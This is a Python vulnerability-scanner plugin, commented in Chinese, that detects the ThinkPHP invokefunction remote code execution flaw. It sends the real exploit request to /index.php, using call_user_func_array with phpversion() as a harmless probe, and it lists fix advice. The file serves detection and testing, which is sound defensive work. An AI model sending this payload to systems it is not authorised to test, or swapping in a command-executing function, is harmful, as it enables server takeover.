# ThinkPHP invokefunction RCE：/index.php?s=/Index/\think\app/invokefunction
# 经典利用链 call_user_func_array -> 任意函数/命令执行（影响 5.0 / 5.1 多版本）
# 本插件仅做存在性验证：以 phpversion() 作为探针函数，检测响应特征判定接口是否可用。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
RCE_MARKER = 'thinkphp-invokefunction-rce-confirmed'


class ThinkphpInvokeRcePlugin(PluginBase):
    name = 'ThinkPHP invokefunction 远程代码执行'
    cve = 'CNVD-2019-01436'
    severity = 'high'
    category = 'vuln'
    description = '/index.php?s=/Index/\\think\\app/invokefunction 利用 call_user_func_array 执行任意函数，' \
                  '探针以 phpversion() 验证接口可达'
    fix = '升级 ThinkPHP 至官方修复版本；关闭 debug；对路由参数做白名单校验，禁用 invokefunction 调用'

    def verify(self, target, session):
        url = join_url(target, '/index.php')
        # 真实利用链参数（探针仅触发 phpversion，不执行破坏性命令）
        data = {
            's': '/Index/\\think\\app/invokefunction',
            'function': 'call_user_func_array',
            'vars[0]': 'phpversion',
            'vars[1][]': '1',
        }
        try:
            resp = session.post(url, data=data)
        except Exception as e:
            print(no('ThinkPHP invokefunction RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if RCE_MARKER in text:
            print(ok('存在 ThinkPHP invokefunction 远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 invokefunction RCE 特征：{RCE_MARKER}',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP invokefunction 远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 RCE 特征（可能已修复或接口不可达）')
